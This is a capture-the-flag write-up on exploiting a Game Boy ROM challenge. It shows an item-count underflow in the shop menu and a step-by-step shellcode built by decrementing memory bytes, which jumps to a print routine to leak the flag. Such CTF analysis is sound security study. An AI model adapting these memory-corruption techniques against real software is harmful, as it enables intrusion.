# AndroNotes

> Come take a break playing this little game...

We get a telnet and a gameboy ROM.

### Part 0 - checking out the game

I's a quite simple game where you can move and shoot enemy, which also tries to shoot at you.
Each enemy killed gains you current `score` amount of `gold`. You can also open shop and buy items for gold.

### Part 1 - reversing

We used [BGB](https://bgb.bircd.org) for dynamic analysis together with Ghidra for static analysis. I've attached our exported ghidra DB.
You need [GhidraBoy](https://github.com/Gekkio/GhidraBoy) plugin to open it tho.

A placeholder flag string is inside the ROM, but is unused. We didn't think that the bug would be in movement function,
so we mostly looked into shop part of the game while reversing.

By setting item counts in debugger to 0xFF we noticed that entire menu is glitched. We can move cursor outside of the 15 item range.
While reversing this behaviour in depth with ghidra the code looked extremly suspicious. Almost as if this bug was made on purpose.

After some time we found how to trigger this bug. You can:

- buy item
- open use menu
- select that you want to throw 1 item
- use the item (which decrements count from 1 to 0)
- throw the item (which decrements count from 0 to 255)

thus you end up with negative amount of an item.

### Part 2 - pwn

Long story short:

- we setup our score to be exactly 0xc3ca, which points into `item_use_ptrs`

```
c3bf 87 57    addr    use_item_0
c3c1 02 58    addr    use_item_1
c3c3 81 58    addr    use_item_2
c3c5 00 59    addr    use_item_3
c3c7 7f 59    addr    use_item_4
c3c9 fe 59    addr    use_item_5   <= we point at byte 59 here
c3cb 7d 5a    addr    use_item_6
c3cd fc 5a    addr    use_item_7
c3cf 7b 5b    addr    use_item_8
c3d1 fa 5b    addr    use_item_9
c3d3 79 5c    addr    use_item_10
c3d5 51 56    addr    use_item_11
c3d7 ad 56    addr    use_item_12
c3d9 f2 56    addr    use_item_13
c3db 3a 57    addr    use_item_14

# gold
c3dd ?? ??    int16_t ??

# flag
6d82          ds      "INS(PLACEHOLDER!!!)"
```

- we prepare our gold for next steps to end with exactly E9, which will be `JMP (HL)` opcode
- we setup our shellcode at 0xc3ca by moving cursor to our shellcode and tossing X amount of items
by doing that we can decrement any positive value (that is <= 0x7F), we can't point our cursor at negative values (or 0).
- call our shellcode by using item

So here's how our shellcode worked without garbage opcodes:

```
LD E, 0x82
LD D, 0x6d
LD HL, 0x5711

# after jump
PUSH    DE
CALL    printf
```

But to make it work with bytes we had at hand and mechanic of only decrementing positive numbers we created:

```
0x59 => toss 27 => 0x3e    # LD A, imm
0x7d => toss 54 => 0x47    # load (lower bytes of flag string pointer shifted right by 1 byte) into A
                           # we do this because flag add ends with 0x82 which is negative

0x5a => toss 44 => 0x2e    # LD L, imm
0xfc =>         => 0xfc    # this operation is just a workaround for not being able to touch 0xfc

0x5a => toss 83 => 0x07    # RLC A
                           # shift A left (to fix the pointer to the flag)

0x7b => toss 28 => 0x5f    # LD E, A
                           # move lower bytes of flag pointer into E

0x5b => toss 29 => 0x3e    # LD A, 0xFA
0xfa =>         => 0xfa    # this operation is just a workaround for not being able to touch 0xfa

0x5b => toss 69 => 0x16    # LD D, imm
0x79 => toss 12 => 0x6d    # move higher bytes of flag pointer into D

0x5c => toss  1 => 0x5b    # LD E, E
                           # NOP

0x51 => toss  2 => 0x4f    # LD C, A
                           # NOP

0x56 => toss  4 => 0x52    # LD D, D
                           # NOP

0xad =>         => 0xad    # XOR L
                           # NOP

0x56 => toss  4 => 0x52    # LD D, C
                           # NOP

0xf2 =>         => 0xf2    # LD A, (C)
                           # NOP

0x56 => toss 53 => 0x21    # LD HL, 0x5711
0x31 => toss 41 => 0x11    # load address where push DE, call printf exists
0x57 =>         => 0x57    # into HL

gold =>         => 0xe9    # JMP (HL)
```

Since we're priting where our score was placed we can only print 3 characters as the rest is printed outside of visible screen.
So we created our shellcode to not crash the game and we have easily movable string pointer at the beginning of the shellcode.
So we used 0x47 to print 3 last characters, then decremented the value to 0x46 to move pointer to print previous characters and so on till 0x41.

*Note: actually 0x41 prints 6 characters, since it overflows text and starts overwriting on the left side as well.*

Flag leaks:

```
0x41: INS(           !!!)
0x43:     H4C
0x44        CKB
0x45          B0Y
0x46            Y'1
0x47              101

Flag: INS(H4CKB0Y'101!!!)
```
